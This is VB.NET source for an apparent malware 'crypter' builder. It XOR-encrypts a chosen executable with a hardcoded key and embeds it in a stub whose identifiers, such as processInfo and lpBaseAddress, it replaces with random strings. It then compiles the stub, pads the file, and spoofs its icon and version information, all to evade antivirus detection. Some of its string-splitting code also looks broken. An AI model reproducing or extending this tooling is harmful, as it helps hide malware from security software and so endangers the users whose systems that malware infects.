﻿Imports System.IO
Imports fLaSh.Dissembler
Public Class Form1
    Dim ofd As New OpenFileDialog
    Dim lo As New OpenFileDialog
    Dim sfd As New SaveFileDialog
    Dim TheEOF As String
    Public Function GetNullBytes(ByRef lNum As Object) As String
        Dim Buf As String
        Dim i As Short
        For i = 1 To lNum
            Buf = Buf & Chr(0)
        Next
        GetNullBytes = Buf
    End Function
    Public Function ReadEOFData(ByRef FilePath As String) As String
        Dim EOFBuf As String
        Dim lPos As Integer
        If Dir(FilePath) = "" Then
            Exit Function
        End If
        Dim ReadFile As String = IO.File.ReadAllText(FilePath)
        lPos = InStr(1, StrReverse(ReadFile), GetNullBytes(30))
        EOFBuf = (Mid(StrReverse(ReadFile), 1, lPos - 1))
        ReadEOFData = StrReverse(EOFBuf)
        If ReadEOFData = "" Then
        End If
        Exit Function
    End Function

    Public Function random_key(ByVal lenght As Integer) As String
        Randomize()
        Dim s As New System.Text.StringBuilder("")
        Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Public Function encrypt(ByVal message As Byte(), ByVal password As String) As Byte()
        Dim passarr As Byte() = System.Text.Encoding.Default.GetBytes(password)
        Randomize()
        Dim rand As Integer = Int((255 - 0 + 1) * Rnd()) + 1
        Dim outarr(message.Length) As Byte
        Dim u As Integer
        For i As Integer = 0 To message.Length - 1
            outarr(i) += (message(i) Xor passarr(u)) Xor rand
            If u = password.Length - 1 Then u = 0 Else u = u + 1
        Next
        outarr(message.Length) = 112 Xor rand
        Return outarr
    End Function

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Try
            sfd.Filter = "Executables *.exe|*.exe"
            If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
                Dim source As String = My.Resources.source ' Declare temporary string storing the source for replacing
                Dim vars As String() = {"%1%", "%2%", "%4%", "%5%", "rand1", "sizel", "processInfo", "procAttr", "passarr", "startupInfo", "num2", "num", "ptr4", "baseAddr", "buffer__1", "bufferSize", "numRead", "dst", "lpBaseAddress", "lpNumberOfBytesWritten", "buffer2", "u1", "i1"} ' Declaring a String Array with all Strings to replace
                For i As Integer = 0 To vars.Length - 1 ' Loop thought all Strings to replace
                    source = source.Replace(vars(i), random_key(300)) ' Replace the fill strings with a random String to make the Server more unique (Basic USG System)
                Next
                Dim input As Byte() = encrypt(IO.File.ReadAllBytes(TextBox1.Text), "okmijnlp") 'Read & Encrypt to crypt
                source = source.Replace("%3%", CD.format(input)) ' Format the input bytes and place them in the temp source
                iCompiler.GenerateExecutable(sfd.FileName, source, "") ' Compile the source using CodeDom
            Else : Exit Sub
            End If
        Catch ex As Exception
        End Try
        If CheckBox1.Checked = True Then
            Dim filesize As Double = Val(NumericUpDown1.Value)
            filesize = filesize * 1048576
            Dim filetopump = IO.File.OpenWrite(sfd.FileName)
            Dim size = filetopump.Seek(0, IO.SeekOrigin.[End])
            While size < filesize
                filetopump.WriteByte(0)
                size += 1
            End While
            filetopump.Close()
        End If
        If CheckBox2.Checked = False Then
        Else
            IO.File.AppendAllText(ofd.FileName, TheEOF)
        End If
        If CheckBox4.Checked = True Then
            Try

                If Not File.Exists(ofd.FileName) Then
                    Throw New Exception("Exe not found!")
                End If

                Cursor.Current = Cursors.WaitCursor
                Application.DoEvents()

                Dim oVersionResource As New VersionResource()
                oVersionResource.LoadFrom(ofd.FileName)

                'build icon..
                '
                oVersionResource.FileVersion = TextBox2.Text
                oVersionResource.ProductVersion = TextBox2.Text
                '
                Dim oStringFileInfo As StringFileInfo = DirectCast(oVersionResource("StringFileInfo"), StringFileInfo)
                oStringFileInfo("FileVersion") = String.Format("{0}" & vbNullChar, oVersionResource.FileVersion)
                oStringFileInfo("ProductVersion") = String.Format("{0}" & vbNullChar, oVersionResource.ProductVersion)
                oStringFileInfo("Assembly Version") = String.Format("{0}" & vbNullChar, oVersionResource.ProductVersion)
                oStringFileInfo("LegalCopyright") = String.Format("{0}" & vbNullChar, txtACopyright.Text.Trim)
                oStringFileInfo("FileDescription") = String.Format("{0}" & vbNullChar, txtADescription.Text.Trim)
                oVersionResource.SaveTo(sfd.FileName)
            Catch ex As Exception
            Finally
                Cursor.Current = Cursors.Default
            End Try
            If CheckBox3.Checked = True Then
                Dim oIconFile As New IconFile(lo.FileName)
                Dim groupIconResource As GroupIconResource = oIconFile.ConvertToGroupIconResource()
                groupIconResource.SaveTo(sfd.FileName)
            End If
        End If
        form2.visible = True
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        ofd.Filter = "Executables *.exe|*.exe"
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            TextBox1.Text = ofd.FileName
            TheEOF = ReadEOFData(ofd.FileName)
            CheckBox1.Enabled = True
            CheckBox2.Enabled = True
            CheckBox3.Enabled = True
            CheckBox4.Enabled = True
            CheckBox3.Text = "Change Icon (No Icon Loaded)"
        Else : TextBox1.Text = ""
        End If
        If TheEOF = Nothing Then
            CheckBox2.Text = "Use EOF (Not Recommended)"
        Else
            CheckBox2.Text = "Use EOF (Recommended)"
        End If

    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub
    Private Sub btnExit_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Me.Close()
    End Sub


    Private Sub btnOpen_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Using o As New OpenFileDialog
            o.Filter = "Executable files (*.exe)|*.exe|"
            o.FileName = TextBox1.Text.Trim
            If o.ShowDialog(Me) = Windows.Forms.DialogResult.OK Then
                TextBox1.Text = o.FileName
            End If
        End Using
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        On Error Resume Next
        lo.Filter = "Icon Files (*.ico)|*.ico"
        lo.ShowDialog()
        Dim o As New Bitmap(lo.FileName)
        picIcon.Image = o
        CheckBox3.Text = "Change Icon (Icon Loaded!)"
    End Sub

    Private Sub CheckBox3_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            Button3.Enabled = True
        Else
            Button3.Enabled = False
        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            NumericUpDown1.Enabled = True
        Else
            NumericUpDown1.Enabled = False
        End If
    End Sub

    Private Sub CheckBox4_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox4.CheckedChanged
        If CheckBox4.Checked = True Then
            txtACompany.Enabled = True
            txtACopyright.Enabled = True
            txtADescription.Enabled = True
            TextBox2.Enabled = True
        Else
            txtACompany.Enabled = False
            txtACopyright.Enabled = False
            txtADescription.Enabled = False
            TextBox2.Enabled = False
        End If
    End Sub
End Class
Public Class CD
    Public Shared Function format(ByVal input As Byte()) As String ' Codedom has maximum of possible chars per line so we are storing the string in multiple strings
        Dim out As New System.Text.StringBuilder ' Declaring a new StringBuilder to store the output string
        Dim base64data As String = Convert.ToBase64String(input) ' Get a readable String from the Byte Array
        Dim arr As String() = SplitString(base64data, 50000) ' Split the string into parts to fit in the Codedom-lines
        For i As Integer = 0 To arr.Length - 1 ' Looping thought each string in the array
            If i = arr.Length - 1 Then  ' If i equals the highest number
                out.Append(Chr(34) & arr(i) & Chr(34))
            Else 'I is smaller than arr.Length - 1 (i < arr.Length - 1)
                out.Append(Chr(34) & arr(i) & Chr(34) & " & _" & vbNewLine)
            End If
        Next
        Return out.ToString
    End Function
    Private Shared Function SplitString(ByVal input As String, ByVal partsize As Long) As String()
        Dim amount As Long = Math.Ceiling(input.Length / partsize) 'Get Long value of the amount of parts using the formular (Length of Input / Length of Parts)
        Dim out(amount - 1) As String 'Declaring the Array to Return using the amount of Parts to define the size
        Dim currentpos As Long = 0 ' Declaring the Currentposition in the String
        For I As Integer = 0 To amount - 1 ' Looping thought each string in the array
            If I = amount - 1 Then ' If i equals the highest number
                Dim temp((input.Length - currentpos) - 1) As Char ' Declaring a temporary Array of Chars for storing the current Part of the String
                input.CopyTo(currentpos, temp, 0, (input.Length - currentpos)) ' Current part is everything left from the string
                out(I) = Convert.ToString(temp) ' Current part is appended to the output string
            Else 'I is smaller than amount - 1 (i < amount - 1)
                Dim temp(partsize - 1) As Char ' Declaring a temporary Array of Chars for storing the current Part if the String using the Size of a part (partsize)
                input.CopyTo(currentpos, temp, 0, partsize) ' Copying the current Part to the temp array
                out(I) = Convert.ToString(temp) ' Current part is appended to the output string
                currentpos += partsize ' Currentposition is increase to catch the next part in the next "round" of the loop
            End If
        Next
        Return out ' Return the Output String
    End Function
End Class
